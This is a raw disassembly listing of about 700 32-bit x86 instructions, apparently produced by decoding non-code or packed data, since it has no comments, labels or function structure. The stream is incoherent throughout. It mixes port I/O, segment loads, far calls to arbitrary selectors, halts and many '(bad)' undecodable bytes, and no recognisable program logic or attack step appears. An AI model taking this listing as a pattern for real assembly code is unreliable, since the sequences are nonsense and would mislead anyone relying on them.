  40b40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b40b:	fst    DWORD PTR [edi+0xd]
  40b40e:	cdq    
  40b40f:	mov    bl,0x40
  40b411:	mov    eax,ds:0x420fad2d
  40b416:	sbb    dl,BYTE PTR [edi-0x44e94c27]
  40b41c:	js     0x40b47b
  40b41e:	push   edi
  40b41f:	scas   eax,DWORD PTR es:[edi]
  40b420:	cmp    al,0x46
  40b422:	mov    bl,0x41
  40b424:	pop    eax
  40b425:	test   al,0x1b
  40b427:	inc    ebx
  40b428:	fwait
  40b429:	mov    al,0xa2
  40b42b:	sub    BYTE PTR [edx+0x3a],bl
  40b42e:	xchg   dh,dl
  40b430:	scas   eax,DWORD PTR es:[edi]
  40b431:	xor    al,0xd6
  40b433:	adc    DWORD PTR [esi-0x14],ebp
  40b436:	push   cs
  40b437:	inc    edi
  40b438:	and    ch,BYTE PTR [edx+0x78]
  40b43b:	sbb    ebx,esp
  40b43d:	or     DWORD PTR [edi+0x16f9683b],esp
  40b443:	les    ecx,FWORD PTR [esi+0x446f9d06]
  40b449:	mov    cs,edx
  40b44b:	cmp    DWORD PTR [edi],ebx
  40b44d:	pop    eax
  40b44e:	xchg   edi,eax
  40b44f:	test   eax,0xc3e868f0
  40b454:	std    
  40b455:	mov    ch,0x9f
  40b457:	iret   
  40b458:	inc    eax
  40b459:	(bad)  
  40b45a:	fild   WORD PTR [eax-0x55f63e2c]
  40b460:	cli    
  40b461:	push   0xd600b2b6
  40b466:	in     eax,dx
  40b467:	mov    ebp,0x9b9d50e5
  40b46c:	loop   0x40b47c
  40b46e:	das    
  40b46f:	cmp    DWORD PTR [ebx+0x15f5e2f0],ebp
  40b475:	(bad)  
  40b476:	in     al,dx
  40b477:	push   esi
  40b478:	mov    ds:0xffd98632,al
  40b47d:	xor    eax,0xcbc6c7b2
  40b482:	dec    esp
  40b483:	fsubr  DWORD PTR [edx+0x4119747a]
  40b489:	adc    esi,ebp
  40b48b:	pusha  
  40b48c:	in     eax,dx
  40b48d:	ds test eax,0xb257be0
  40b493:	and    DWORD PTR [eax-0x3f090dd0],0xfffffffc
  40b49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49b:	ins    BYTE PTR es:[edi],dx
  40b49c:	cmp    DWORD PTR [eax],edx
  40b49e:	setae  ah
  40b4a1:	gs shr ah,0x48
  40b4a5:	sub    ah,BYTE PTR [ebx+0x30e2db71]
  40b4ab:	cmp    DWORD PTR [ebp-0x5cd05c75],0x2413bd39
  40b4b5:	or     bh,BYTE PTR [ebp-0x38]
  40b4b8:	sub    ch,BYTE PTR [edi+0x56b1ee6c]
  40b4be:	call   0x247f:0x3815a7cf
  40b4c5:	cld    
  40b4c6:	and    DWORD PTR [ebx+ebp*2],esi
  40b4c9:	sbb    al,0x56
  40b4cb:	fild   WORD PTR [esi-0x77]
  40b4ce:	sbb    BYTE PTR [ebx+ebx*4+0x3da9ee80],ah
  40b4d5:	popf   
  40b4d6:	es retf 
  40b4d8:	dec    ebx
  40b4d9:	gs jl  0x40b4b1
  40b4dc:	inc    eax
  40b4dd:	mov    edi,0x5897f453
  40b4e2:	loopne 0x40b49f
  40b4e4:	test   BYTE PTR [ebx],ch
  40b4e6:	mov    dl,0x32
  40b4e8:	mov    edx,0x908dfa2b
  40b4ed:	inc    ecx
  40b4ee:	data16 jne 0x40b52f
  40b4f1:	xchg   ebx,eax
  40b4f2:	and    al,0x34
  40b4f4:	stos   DWORD PTR es:[edi],eax
  40b4f5:	pop    ecx
  40b4f6:	loopne 0x40b50a
  40b4f8:	repnz sahf 
  40b4fa:	fcomp  DWORD PTR [edi+0x39]
  40b4fd:	es mov dl,0x92
  40b500:	cdq    
  40b501:	mov    al,0x4c
  40b503:	mov    cl,0x8b
  40b505:	push   ebx
  40b506:	pusha  
  40b507:	xchg   ecx,eax
  40b508:	jge    0x40b495
  40b50a:	push   edx
  40b50b:	out    dx,eax
  40b50c:	xchg   ebx,eax
  40b50d:	ins    BYTE PTR es:[edi],dx
  40b50e:	sahf   
  40b50f:	dec    eax
  40b510:	clc    
  40b511:	sub    DWORD PTR [edi+eiz*8-0x5d],0xe64a062f
  40b519:	cmp    ch,cl
  40b51b:	push   esi
  40b51c:	test   BYTE PTR [edi+0xd],0xc8
  40b520:	fs (bad) 
  40b522:	mov    ch,0x13
  40b524:	test   BYTE PTR [esi+0x355d9ff5],al
  40b52a:	cdq    
  40b52b:	mov    dl,0xd2
  40b52d:	add    eax,0x3414883c
  40b532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b533:	in     al,dx
  40b534:	stos   DWORD PTR es:[edi],eax
  40b535:	adc    eax,0xc60055ad
  40b53a:	mov    ecx,?
  40b53c:	cmp    cl,BYTE PTR [edx]
  40b53e:	out    0x12,al
  40b540:	out    dx,al
  40b541:	sar    DWORD PTR [edi+0x540de028],0x3a
  40b548:	cld    
  40b549:	add    BYTE PTR [edi],bh
  40b54b:	mov    esi,0xd0225b2e
  40b550:	lds    ecx,FWORD PTR es:[esi-0x5abf64f5]
  40b557:	mov    eax,?
  40b559:	adc    eax,0x52babaff
  40b55e:	mov    ah,0x5c
  40b560:	inc    ebx
  40b561:	mov    BYTE PTR [esi],bl
  40b563:	sbb    DWORD PTR [esi],0x9fe08cb7
  40b569:	es iret 
  40b56b:	pusha  
  40b56c:	ret    0x828a
  40b56f:	idiv   DWORD PTR [ebx+esi*2-0x4065417a]
  40b576:	repnz cs out 0x2e,eax
  40b57a:	loopne 0x40b512
  40b57c:	inc    edx
  40b57d:	push   ss
  40b57e:	mov    al,ds:0xf5905174
  40b583:	jge    0x40b5cb
  40b585:	mov    edi,0x9bd4a5e9
  40b58a:	shl    ch,cl
  40b58c:	pusha  
  40b58d:	call   0x315b:0xe9c0ffda
  40b594:	repz push edi
  40b596:	and    dl,bl
  40b598:	push   ds
  40b599:	scas   eax,DWORD PTR es:[edi]
  40b59a:	in     al,0xf1
  40b59c:	push   esp
  40b59d:	(bad)  
  40b59e:	sub    DWORD PTR [eax-0x7a],ebp
  40b5a1:	sub    al,BYTE PTR [esi-0x28f9784c]
  40b5a7:	dec    esp
  40b5a8:	leave  
  40b5a9:	fmul   st(4),st
  40b5ab:	imul   edx,DWORD PTR ds:0xb8dc9bf7,0xf6708bbf
  40b5b5:	mov    ah,0x20
  40b5b7:	out    0x39,eax
  40b5b9:	mov    edi,0x8a88667f
  40b5be:	mov    ch,0xec
  40b5c0:	mov    ecx,0x41ba77e
  40b5c5:	mov    ebp,0x93a55e72
  40b5ca:	div    ebx
  40b5cc:	call   0x396aa2c
  40b5d1:	(bad)  
  40b5d2:	(bad)  
  40b5d4:	imul   ecx,DWORD PTR [eax+0x750cd800],0x91a15ce4
  40b5de:	jp     0x40b571
  40b5e0:	sub    eax,0x7fea0887
  40b5e5:	push   ds
  40b5e6:	leave  
  40b5e7:	rol    DWORD PTR [esi-0x3129eca1],0x3c
  40b5ee:	add    BYTE PTR [eax+0x61],0xc7
  40b5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5f3:	jmp    0x40b5af
  40b5f5:	bound  edx,QWORD PTR [esi+0x757b95b0]
  40b5fb:	(bad)  
  40b5fc:	pushf  
  40b5fd:	jg     0x40b643
  40b5ff:	scas   al,BYTE PTR es:[edi]
  40b600:	xor    al,0x92
  40b602:	or     ebx,DWORD PTR [ebx]
  40b604:	fs cdq 
  40b606:	add    DWORD PTR [ecx],eax
  40b608:	add    ah,BYTE PTR [esi+0x7d]
  40b60b:	ret    
  40b60c:	sbb    al,0xfb
  40b60e:	or     BYTE PTR [eax-0x54f6654],0x9d
  40b615:	(bad)  
  40b616:	jne    0x40b5c1
  40b618:	ins    BYTE PTR es:[edi],dx
  40b619:	pop    edi
  40b61a:	inc    ebx
  40b61b:	pushf  
  40b61c:	mov    esi,0xecb4100f
  40b621:	lahf   
  40b622:	xchg   edi,eax
  40b623:	in     al,0x5a
  40b625:	pusha  
  40b626:	mov    bl,0xc8
  40b628:	mov    dh,0x3a
  40b62a:	jbe    0x40b615
  40b62c:	add    eax,0x1fff0753
  40b631:	cwde   
  40b632:	leave  
  40b633:	daa    
  40b634:	hlt    
  40b635:	jle    0x40b681
  40b637:	push   eax
  40b638:	in     al,dx
  40b639:	(bad)  
  40b63a:	jbe    0x40b669
  40b63c:	or     eax,0x9cfb56f7
  40b641:	or     ebx,esp
  40b643:	mov    dl,0xa7
  40b645:	xor    edx,DWORD PTR [ebx+0x24]
  40b648:	inc    esi
  40b649:	mov    al,ds:0xb4ac940c
  40b64e:	inc    esi
  40b64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b650:	cld    
  40b651:	in     al,0xe0
  40b653:	popf   
  40b654:	iret   
  40b655:	das    
  40b656:	jae    0x40b5e8
  40b658:	retf   0x8e36
  40b65b:	mov    DWORD PTR [esi],ebx
  40b65d:	sub    BYTE PTR [esi+eiz*4+0x8],0x6
  40b662:	sub    dh,BYTE PTR [edi+eiz*8+0x64]
  40b666:	sbb    al,0x0
  40b668:	mov    ebx,fs
  40b66a:	sub    al,0xdd
  40b66c:	dec    edx
  40b66d:	rcl    ebp,cl
  40b66f:	retf   0x5bc6
  40b672:	fstp   DWORD PTR [edx-0x628a4f5c]
  40b678:	shl    DWORD PTR [edi],0x66
  40b67b:	jbe    0x40b6e8
  40b67d:	int    0xf7
  40b67f:	xchg   ebp,eax
  40b680:	jg     0x40b65b
  40b682:	test   ch,0xaa
  40b685:	sbb    DWORD PTR [eax+0x9716e9],esi
  40b68b:	int    0x52
  40b68d:	in     eax,dx
  40b68e:	mov    bl,0x1b
  40b690:	in     al,0xff
  40b692:	sub    al,0xd2
  40b694:	dec    ebx
  40b695:	and    al,0x74
  40b697:	adc    DWORD PTR [esi-0x2f],ebx
  40b69a:	jb     0x40b6e4
  40b69c:	add    al,0x64
  40b69e:	xchg   ebp,ebx
  40b6a0:	fst    DWORD PTR [eax-0x1e41b88c]
  40b6a6:	pop    eax
  40b6a7:	pop    esp
  40b6a8:	aam    0x21
  40b6aa:	dec    edx
  40b6ab:	add    al,bh
  40b6ad:	imul   BYTE PTR [edx+ebp*2+0x4d]
  40b6b1:	dec    ebx
  40b6b2:	jg     0x40b638
  40b6b4:	push   esp
  40b6b5:	sbb    ch,BYTE PTR [ebx+ecx*4+0x462d85c4]
  40b6bc:	in     al,dx
  40b6bd:	ss xchg esi,eax
  40b6bf:	jecxz  0x40b709
  40b6c1:	adc    al,0xba
  40b6c3:	add    BYTE PTR [edi-0x298007ea],cl
  40b6c9:	sub    eax,0xb9a510b3
  40b6ce:	sbb    al,0x21
  40b6d0:	pusha  
  40b6d1:	cli    
  40b6d2:	xor    ch,0xa6
  40b6d5:	dec    eax
  40b6d6:	xchg   edi,eax
  40b6d7:	cmp    edx,DWORD PTR cs:[esi-0x4f694c68]
  40b6de:	xor    BYTE PTR [edi+0x108462a7],bl
  40b6e4:	stc    
  40b6e5:	jle    0x40b6ae
  40b6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6e8:	das    
  40b6e9:	push   0xe2a24bb7
  40b6ee:	rcl    BYTE PTR [ebp+0x5d],1
  40b6f1:	push   cs
  40b6f2:	pop    esi
  40b6f3:	adc    ecx,DWORD PTR [ecx+0x987e901]
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [eax+0x1476a29c],?
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	sub    DWORD PTR [edi-0x360ddeb3],esp
  40b72a:	mov    ?,WORD PTR [eax]
  40b72c:	push   edi
  40b72d:	mov    edx,0xfcb6bcd2
  40b732:	xor    al,0x5e
  40b734:	pusha  
  40b735:	icebp  
  40b736:	sbb    BYTE PTR [ecx+0x23de77e],dh
  40b73c:	push   edx
  40b73d:	test   eax,0xa8409eb9
  40b742:	cli    
  40b743:	in     eax,0x9c
  40b745:	sbb    al,ch
  40b747:	inc    esi
  40b748:	test   eax,0xde97e303
  40b74d:	xor    al,BYTE PTR [ecx]
  40b74f:	ss mov ebp,0xdadb1dad
  40b755:	or     al,0x83
  40b757:	mov    edi,0xe3f20b6a
  40b75c:	push   ebp
  40b75d:	test   esi,edi
  40b75f:	jbe    0x40b79a
  40b761:	call   DWORD PTR [edi+0x75]
  40b764:	mov    ecx,DWORD PTR [ebx]
  40b766:	in     al,0xac
  40b768:	mov    esp,0xc8c71d2b
  40b76d:	add    eax,0x9cb496ef
  40b772:	dec    eax
  40b773:	xchg   ebx,eax
  40b774:	push   ecx
  40b775:	fist   DWORD PTR [ecx]
  40b777:	mov    esp,0x3ca7e429
  40b77c:	ret    
  40b77d:	or     DWORD PTR [ecx+0x6d0d28ce],edx
  40b783:	mov    BYTE PTR [eax-0x1625fe68],bl
  40b789:	inc    esi
  40b78a:	mov    eax,ds:0xd9311690
  40b78f:	add    eax,0xe9b239f3
  40b794:	add    dh,BYTE PTR ds:0xdd6b4371
  40b79a:	pop    edi
  40b79b:	cli    
  40b79c:	and    edi,DWORD PTR [eax+edi*8]
  40b79f:	push   ebx
  40b7a0:	sub    ebp,ebp
  40b7a2:	mov    ds:0x393963d0,al
  40b7a7:	sbb    DWORD PTR [esi+0x3],ebp
  40b7aa:	sbb    eax,0xf37bad0a
  40b7af:	sahf   
  40b7b0:	scas   eax,DWORD PTR es:[edi]
  40b7b1:	fmul   st,st(1)
  40b7b3:	dec    edx
  40b7b4:	pop    ebx
  40b7b5:	cmovp  ebp,DWORD PTR [ecx+0x77]
  40b7b9:	sub    ebx,ecx
  40b7bb:	enter  0x4f36,0x29
  40b7bf:	sub    bh,BYTE PTR [ecx+0x7a2d6e8f]
  40b7c5:	cli    
  40b7c6:	and    al,0x5f
  40b7c8:	push   ecx
  40b7c9:	stos   BYTE PTR es:[edi],al
  40b7ca:	push   edi
  40b7cb:	mov    al,0xef
  40b7cd:	in     al,0x6d
  40b7cf:	push   edx
  40b7d0:	hlt    
  40b7d1:	xor    BYTE PTR [eax+0x4d],0x6
  40b7d5:	and    ebp,DWORD PTR [edx]
  40b7d7:	std    
  40b7d8:	jno    0x40b76b
  40b7da:	retf   0xe6c4
  40b7dd:	stos   BYTE PTR es:[edi],al
  40b7de:	aad    0x99
  40b7e0:	add    ecx,DWORD PTR [ebx+0x20fcde52]
  40b7e6:	cmp    ch,BYTE PTR [ebp-0x44e6737b]
  40b7ec:	jle    0x40b76f
  40b7ee:	dec    esi
  40b7ef:	cmp    BYTE PTR [ebx],0x39
  40b7f2:	ds aam 0xdb
  40b7f5:	ds jo  0x40b7bf
  40b7f8:	pop    ecx
  40b7f9:	outs   dx,BYTE PTR ds:[esi]
  40b7fa:	mov    ch,0xbb
  40b7fc:	loopne 0x40b784
  40b7fe:	fdiv   QWORD PTR [esi-0x1ff98264]
  40b804:	inc    ah
  40b806:	repnz data16 add al,al
  40b80a:	xchg   ebx,eax
  40b80b:	stc    
  40b80c:	fwait
  40b80d:	test   al,0xec
  40b80f:	push   es
  40b810:	sbb    BYTE PTR [edi+0x1f],ah
  40b813:	inc    ebx
  40b814:	(bad)  
  40b815:	(bad)  
  40b816:	inc    ebp
  40b817:	les    esp,FWORD PTR [ebx]
  40b819:	nop
  40b81a:	test   BYTE PTR [ecx-0x7a37c99a],dl
  40b820:	adc    bl,BYTE PTR [edi+0x6c]
  40b823:	hlt    
  40b824:	adc    ecx,ebp
  40b826:	or     dl,0x1a
  40b829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b82a:	mov    bh,0xbf
  40b82c:	gs loopne 0x40b7ca
  40b82f:	outs   dx,BYTE PTR ds:[esi]
  40b830:	repz popf 
  40b832:	jmp    0x40b81b
  40b834:	int3   
  40b835:	sub    cl,ch
  40b837:	leave  
  40b838:	mov    ?,WORD PTR [edx]
  40b83a:	push   ecx
  40b83b:	and    dl,bh
  40b83d:	inc    edx
  40b83e:	push   edi
  40b83f:	(bad)
  40b843:	sub    esp,eax
  40b845:	iret   
  40b846:	lods   al,BYTE PTR ds:[esi]
  40b847:	dec    ecx
  40b848:	fisttp DWORD PTR [edx-0x70]
  40b84b:	loop   0x40b827
  40b84d:	fiadd  DWORD PTR [edx]
  40b84f:	jge    0x40b7f0
  40b851:	xchg   BYTE PTR [ecx+0x4],bl
  40b854:	push   edx
  40b855:	adc    DWORD PTR [ebp-0xd79429],ebx
  40b85b:	cmp    ebx,DWORD PTR [edx-0x7dac1a2d]
  40b861:	mov    cl,0x20
  40b863:	ins    BYTE PTR es:[edi],dx
  40b864:	jo     0x40b86c
  40b866:	pop    ecx
  40b867:	rcl    DWORD PTR [ebp+0x7ec0b608],1
  40b86d:	stos   DWORD PTR es:[edi],eax
  40b86e:	cmp    ah,BYTE PTR [ebp-0xe28b9e9]
  40b874:	mov    ebx,0x8ee947a0
  40b879:	arpl   sp,bp
  40b87b:	rcl    ah,cl
  40b87d:	cmp    esp,DWORD PTR [ecx+0x430fcfb1]
  40b883:	pop    edi
  40b884:	xlat   BYTE PTR ds:[ebx]
  40b885:	aaa    
  40b886:	std    
  40b887:	jl     0x40b875
  40b889:	arpl   WORD PTR [eax+ebx*1-0x2e],si
  40b88d:	xchg   esi,eax
  40b88e:	xchg   esp,eax
  40b88f:	in     al,dx
  40b890:	cdq    
  40b891:	inc    esp
  40b892:	nop
  40b893:	out    0x9,al
  40b895:	imul   ebp,ebx,0x5676fc77
  40b89b:	cmp    DWORD PTR [esi],ebx
  40b89d:	cld    
  40b89e:	dec    esi
  40b89f:	jle    0x40b8b6
  40b8a1:	xchg   BYTE PTR [eax],dl
  40b8a3:	aad    0xe0
  40b8a5:	js     0x40b89e
  40b8a7:	(bad)  
  40b8a8:	cmc    
  40b8a9:	inc    ebp
  40b8aa:	popf   
  40b8ab:	mov    DWORD PTR [esi-0xf709210],ecx
  40b8b1:	cmp    ch,BYTE PTR [edi-0x64]
  40b8b4:	push   ebp
  40b8b5:	popa   
  40b8b6:	xchg   DWORD PTR [ebx-0x309cda48],esi
  40b8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8bd:	xchg   edx,eax
  40b8be:	int    0xdc
  40b8c0:	push   esi
  40b8c1:	mov    ah,0x76
  40b8c3:	or     DWORD PTR [esi],0x5e
  40b8c6:	fdivr  st,st(4)
  40b8c8:	pop    edx
  40b8c9:	aad    0xc8
  40b8cb:	dec    eax
  40b8cc:	lahf   
  40b8cd:	pop    ss
  40b8ce:	out    dx,al
  40b8cf:	out    dx,al
  40b8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8d1:	sbb    esp,DWORD PTR [edx-0x4d0d2bdd]
  40b8d7:	adc    dl,BYTE PTR [ebp-0x7ea99bdf]
  40b8dd:	stos   BYTE PTR es:[edi],al
  40b8de:	sub    esp,esp
  40b8e0:	jbe    0x40b93e
  40b8e2:	mov    BYTE PTR [esp+esi*1-0x37],ch
  40b8e6:	rcl    BYTE PTR [esi],cl
  40b8e8:	xor    al,0xbb
  40b8ea:	and    BYTE PTR [edi+ebx*8+0x13],dl
  40b8ee:	imul   edi,edi,0x6a
  40b8f1:	pop    ebp
  40b8f2:	push   edi
  40b8f3:	push   0xffffffb5
  40b8f5:	mov    ds:0xafdcaaff,al
  40b8fa:	dec    esi
  40b8fb:	pop    es
  40b8fc:	push   0xffffffdb
  40b8fe:	rcr    BYTE PTR [edi+0x75],1
  40b901:	scas   eax,DWORD PTR es:[edi]
  40b902:	(bad)  
  40b903:	icebp  
  40b904:	adc    dh,BYTE PTR [edx-0x71422466]
  40b90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b90b:	or     DWORD PTR [ecx-0x37815ebb],ecx
  40b911:	mov    dl,0x2e
  40b913:	out    0x14,al
  40b915:	xchg   BYTE PTR [edx],dl
  40b917:	add    eax,edx
  40b919:	pop    esi
  40b91a:	fwait
  40b91b:	jp     0x40b95b
  40b91d:	sti    
  40b91e:	add    eax,0x252ec59e
  40b923:	outs   dx,BYTE PTR ds:[esi]
  40b924:	clc    
  40b925:	neg    BYTE PTR [ecx+0xe]
  40b928:	pusha  
  40b929:	add    DWORD PTR [edx],edi
  40b92b:	fs fs and eax,0xd5ef0fc5
  40b932:	mov    ds:0xab54496,eax
  40b937:	or     al,0x91
  40b939:	out    dx,al
  40b93a:	nop
  40b93b:	jo     0x40b96a
  40b93d:	sub    bl,bh
  40b93f:	fwait
  40b940:	mov    ch,0x53
  40b942:	cmp    al,0x8c
  40b944:	inc    esp
  40b945:	fsub   st(2),st
  40b947:	mov    BYTE PTR [eax],cl
  40b949:	mov    ah,0x14
  40b94b:	ss mov edx,0x16d42697
  40b951:	sub    BYTE PTR [esi-0x62],al
  40b954:	int    0xe3
  40b956:	dec    eax
  40b957:	mov    ecx,0x19f5d28b
  40b95c:	sbb    eax,DWORD PTR [ecx+0x32]
  40b95f:	jne    0x40b9a0
  40b961:	mov    dl,0xcf
  40b963:	xor    al,0x9b
  40b965:	pushf  
  40b966:	lods   al,BYTE PTR ds:[esi]
  40b967:	mov    DWORD PTR [edi-0x40],ebx
  40b96a:	sbb    bh,bl
  40b96c:	push   ecx
  40b96d:	dec    esi
  40b96e:	pop    edx
  40b96f:	ins    DWORD PTR es:[edi],dx
  40b970:	jl     0x40b939
  40b972:	fs sti 
  40b974:	sbb    al,0x40
  40b976:	out    dx,al
  40b977:	adc    BYTE PTR [ebx-0x18],ch
  40b97a:	in     al,0xad
  40b97c:	pop    ss
  40b97d:	fcom   QWORD PTR [edx+0x3cb0d625]
  40b983:	not    BYTE PTR [ebx]
  40b985:	inc    ebp
  40b986:	mov    ah,0x4b
  40b988:	jl     0x40ba07
  40b98a:	leave  
  40b98b:	mov    es:0xd690975e,al
  40b991:	add    DWORD PTR [esp+ebx*1-0xb0d8819],eax
  40b998:	push   es
  40b999:	jnp    0x40b950
  40b99b:	xchg   esp,eax
  40b99c:	cmp    eax,0x1d5010c8
  40b9a1:	mov    bl,0x97
  40b9a3:	inc    DWORD PTR [ebp+0xa096bb2]
  40b9a9:	inc    edi
  40b9aa:	mov    edi,0x84ae99e9
  40b9af:	add    BYTE PTR [esi],bl
  40b9b1:	les    eax,FWORD PTR [edi]
  40b9b3:	push   ebx
  40b9b4:	in     al,dx
  40b9b5:	pop    ss
  40b9b6:	adc    BYTE PTR [ecx+eax*4+0x61],cl
  40b9ba:	retf   0x7fc0
  40b9bd:	and    al,0xe0
  40b9bf:	stc    
  40b9c0:	jno    0x40b95c
  40b9c2:	and    DWORD PTR [eax+0x5f],esp
  40b9c5:	cld    
  40b9c6:	fdivr  st(0),st
  40b9c8:	jno    0x40b94b
  40b9ca:	nop
  40b9cb:	outs   dx,DWORD PTR ds:[esi]
  40b9cc:	imul   edi,esi,0x963b6755
  40b9d2:	jno    0x40ba03
  40b9d4:	fistp  WORD PTR ds:0xf4c44d5b
  40b9da:	lods   eax,DWORD PTR ds:[esi]
  40b9db:	or     eax,0x4a981725
  40b9e0:	add    bl,BYTE PTR [edx-0x7f]
  40b9e3:	aaa    
  40b9e4:	sub    BYTE PTR [edx],0x9e
  40b9e7:	xor    eax,0x5c731993
  40b9ec:	test   eax,0xa49f8e0d
  40b9f1:	sar    BYTE PTR [eax],cl
  40b9f3:	xor    eax,0x2fbf3561
  40b9f8:	mov    BYTE PTR [esi+ebx*1+0x37],bl
  40b9fc:	inc    ebp
  40b9fd:	shr    esi,cl
  40b9ff:	mov    bl,0xff
  40ba01:	push   cs
  40ba02:	into   
  40ba03:	test   DWORD PTR [eax],esp
  40ba05:	dec    ebp
  40ba06:	jge    0x40ba6f
  40ba08:	mov    BYTE PTR [eax+0x28],ch
  40ba0b:	jge    0x40b9e5
  40ba0d:	nop
  40ba0e:	xchg   edi,eax
  40ba0f:	push   cs
  40ba10:	loopne 0x40b9d4
  40ba12:	mov    cl,0x80
  40ba14:	cmp    eax,0x84982cc2
  40ba19:	loopne 0x40b9fb
  40ba1b:	lods   eax,DWORD PTR ds:[esi]
  40ba1c:	push   0x4b
  40ba1e:	inc    ecx
  40ba1f:	popa   
  40ba20:	(bad)  
  40ba21:	stc    
  40ba22:	xor    al,0x35
  40ba24:	xor    dl,BYTE PTR [esi+ecx*8-0x7ba746a]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    al,BYTE PTR [edx]
  40ba40:	sub    eax,edi
  40ba42:	mov    edx,DWORD PTR [eax]
  40ba44:	xchg   DWORD PTR [esi+0x7e],edi
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	sti    
  40ba4c:	int    0xf3
  40ba4e:	cld    
  40ba4f:	adc    DWORD PTR [edx],0xffffffdb
  40ba52:	add    DWORD PTR [ecx-0x79],0x270aad9
  40ba59:	test   DWORD PTR [edi+eiz*2],ebp
  40ba5c:	call   0x288d9073
  40ba61:	lods   eax,DWORD PTR ds:[esi]
  40ba62:	test   al,0x43
  40ba64:	jno    0x40badf
  40ba66:	push   ecx
  40ba67:	or     eax,0xfe8594c7
  40ba6c:	add    al,0x7f
  40ba6e:	lea    ecx,ds:[eax]
  40ba71:	or     al,0x1b
  40ba73:	jle    0x40ba4d
  40ba75:	mov    eax,ds:0xec042a3
  40ba7a:	adc    BYTE PTR [esi+0x4b],bl
  40ba7d:	ret    
  40ba7e:	ins    BYTE PTR es:[edi],dx
  40ba7f:	cmp    ebp,esi
  40ba81:	cwde   
  40ba82:	inc    ecx
  40ba83:	mul    DWORD PTR [esi+0x27112486]
  40ba89:	aam    0x3d
  40ba8b:	cmc    
  40ba8c:	and    bh,BYTE PTR [edx+0x16]
  40ba8f:	xor    ebx,ebp
  40ba91:	fs push ecx
  40ba93:	sub    esi,ecx
  40ba95:	hlt    
  40ba96:	mov    bl,0x40
  40ba98:	cli    
  40ba99:	push   edx
  40ba9a:	or     esi,ecx
  40ba9c:	in     eax,0xab
  40ba9e:	fistp  QWORD PTR [edx+0x4]
  40baa1:	ins    DWORD PTR es:[edi],dx
  40baa2:	ins    DWORD PTR es:[edi],dx
  40baa3:	neg    cl
  40baa5:	adc    eax,0xfea96758
  40baaa:	inc    esi
  40baab:	(bad)  
  40baac:	adc    bl,BYTE PTR [ebx]
  40baae:	or     esi,0xffffffaa
  40bab1:	mov    al,0x8c
  40bab3:	in     al,dx
  40bab4:	cli    
  40bab5:	add    DWORD PTR [edx+0x266075a9],0x6255b678
  40babf:	addr16 psubw mm0,mm3
  40bac3:	mov    al,ds:0xa1575c14
  40bac8:	cmp    DWORD PTR [edx-0x45],edx
  40bacb:	xlat   BYTE PTR ds:[ebx]
  40bacc:	cmp    esi,DWORD PTR [edi]
  40bace:	add    eax,0xf45a43f7
  40bad3:	jo     0x40bb0c
  40bad5:	icebp  
  40bad6:	cmc    
  40bad7:	sub    edx,DWORD PTR [eax-0x6b60dee1]
  40badd:	push   cs
  40bade:	adc    eax,0x7520ab98
  40bae3:	scas   eax,DWORD PTR es:[edi]
  40bae4:	jmp    DWORD PTR [ebx+0x71]
  40bae7:	fistp  DWORD PTR [edi-0x44]
  40baea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baeb:	and    BYTE PTR [eax+0x5418a1de],cl
  40baf1:	push   edx
  40baf2:	mov    cl,0xc8
  40baf4:	pop    ss
  40baf5:	sbb    ch,ch
  40baf7:	lea    edx,[edx]
  40baf9:	ins    BYTE PTR es:[edi],dx
  40bafa:	jbe    0x40bb54
  40bafc:	adc    BYTE PTR [edi-0x60e830f6],bl
  40bb02:	mov    ah,0x3f
  40bb04:	mov    WORD PTR [ebx+0x64345596],fs
  40bb0a:	jo     0x40bac8
  40bb0c:	aam    0x64
  40bb0e:	mov    ebx,edx
  40bb10:	lock retf 
  40bb12:	jns    0x40bab5
  40bb14:	cmp    ebx,DWORD PTR [edx+0x4c]
  40bb17:	dec    esi
  40bb18:	fist   DWORD PTR [esi+0x52]
  40bb1b:	addr16 stc 
  40bb1d:	outs   dx,DWORD PTR ds:[esi]
  40bb1e:	nop
  40bb1f:	arpl   WORD PTR [ecx+0x26382eeb],di
  40bb25:	(bad)  
  40bb26:	call   0xbc0e38b3
  40bb2b:	xchg   edx,eax
  40bb2c:	fs js  0x40bb23
  40bb2f:	xor    ah,BYTE PTR [esi-0x2eed1576]
  40bb35:	dec    edx
  40bb36:	and    BYTE PTR [edi+0x26],bl
  40bb39:	push   ds
  40bb3a:	and    al,0x4d
  40bb3c:	in     al,dx
  40bb3d:	dec    edx
  40bb3e:	fstp   QWORD PTR [eax+0x58]
  40bb41:	jge    0x40bb88
  40bb43:	jmp    0x40bb8d
  40bb45:	ret    0x57fe
  40bb48:	jae    0x40bb3d
  40bb4a:	mov    eax,ds:0xb86b8b56
  40bb4f:	fs pop edx
  40bb51:	mov    DWORD PTR [edi+ebp*1],edx
  40bb54:	(bad)  
  40bb55:	outs   dx,DWORD PTR ds:[esi]
  40bb56:	xchg   ebp,eax
  40bb57:	push   ebx
  40bb58:	out    dx,eax
  40bb59:	in     eax,0xf5
